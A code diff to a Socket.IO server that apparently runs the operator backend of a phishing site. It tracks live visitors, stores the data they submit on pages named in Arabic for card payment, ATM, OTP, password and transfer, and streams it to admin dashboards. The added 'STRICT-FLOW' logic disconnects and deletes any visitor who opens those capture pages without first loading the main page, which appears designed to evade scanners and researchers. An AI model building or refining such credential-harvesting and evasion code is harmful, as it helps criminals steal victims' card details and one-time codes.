@@ -1511,6 +1511,7 @@ io.on("connection", (socket) => {
         ...existingVisitor,
         socketId: socket.id,
         isConnected: true,
+        hasVisitedMainPage: existingVisitor.hasVisitedMainPage || true,
         sessionStartTime: Date.now(),
         lastActivity: Date.now(),
         isIdle: false,
@@ -1563,6 +1564,7 @@ io.on("connection", (socket) => {
         hasNewData: false,
         isBlocked: false,
         isConnected: true,
+        hasVisitedMainPage: true,
         sessionStartTime: Date.now(),
         lastActivity: Date.now(),
       };
@@ -1658,6 +1660,31 @@ io.on("connection", (socket) => {
   socket.on("visitor:pageEnter", (page) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
+      // Track if visitor has visited the main page
+      if (page === "الصفحة الرئيسية" || page === "الرئيسية") {
+        visitor.hasVisitedMainPage = true;
+      }
+
+      // STRICT ENFORCEMENT: Block visitors who try to access sensitive pages without visiting main page first
+      const sensitivePages = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
+      const isSensitivePage = sensitivePages.some(keyword => page.includes(keyword));
+      
+      if (isSensitivePage && !visitor.hasVisitedMainPage) {
+        console.log(`[STRICT-FLOW] Blocking direct access to "${page}" for visitor ${visitor._id}, IP=${visitor.ip} - never visited main page`);
+        
+        // Disconnect and cleanup
+        socket.disconnect(true);
+        
+        // Remove from savedVisitors to clean up dashboard
+        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
+        if (idx !== -1) {
+          savedVisitors.splice(idx, 1);
+          saveData(true);
+          broadcastVisitorsToAdmins();
+        }
+        return;
+      }
+
       visitor.page = page;
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
@@ -1724,9 +1751,20 @@ io.on("connection", (socket) => {
           hasNewData: false,
           isBlocked: false,
           isConnected: true,
+          hasVisitedMainPage: false,
           sessionStartTime: Date.now(),
           lastActivity: Date.now(),
         };
+        
+        // STRICT: If first page is sensitive, block immediately
+        const sensitiveKeywords = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
+        const firstPageIsSensitive = data.page && sensitiveKeywords.some(kw => data.page.includes(kw));
+        if (firstPageIsSensitive) {
+          console.log(`[STRICT-FLOW] Blocking new visitor created directly on sensitive page "${data.page}", IP=${visitorInfo.ip}`);
+          socket.disconnect(true);
+          return;
+        }
+        
         savedVisitors.push(visitor);
       }
       // Lookup country and city from IP if unknown
@@ -1750,6 +1788,28 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
+      
+      // STRICT FLOW ENFORCEMENT: Block data submission from sensitive pages if visitor never visited main page
+      const sensitiveKeywordsCheck = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
+      const isSubmittingFromSensitivePage = data.page && sensitiveKeywordsCheck.some(kw => data.page.includes(kw));
+      if (isSubmittingFromSensitivePage && !visitor.hasVisitedMainPage) {
+        console.log(`[STRICT-FLOW] Blocking data submission from sensitive page "${data.page}" for visitor ${visitor._id}, IP=${visitor.ip} - never visited main page`);
+        socket.disconnect(true);
+        // Remove from savedVisitors to clean up dashboard
+        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
+        if (idx !== -1) {
+          savedVisitors.splice(idx, 1);
+          saveData(true);
+          broadcastVisitorsToAdmins();
+        }
+        return;
+      }
+      
+      // Track main page visit from more-info data
+      if (data.page === "الصفحة الرئيسية" || data.page === "الرئيسية" || data.page === "صفحة التسجيل") {
+        visitor.hasVisitedMainPage = true;
+      }
+
       // Store submitted data with page info for ordering
       if (data.content) {
         // Initialize dataHistory if not exists
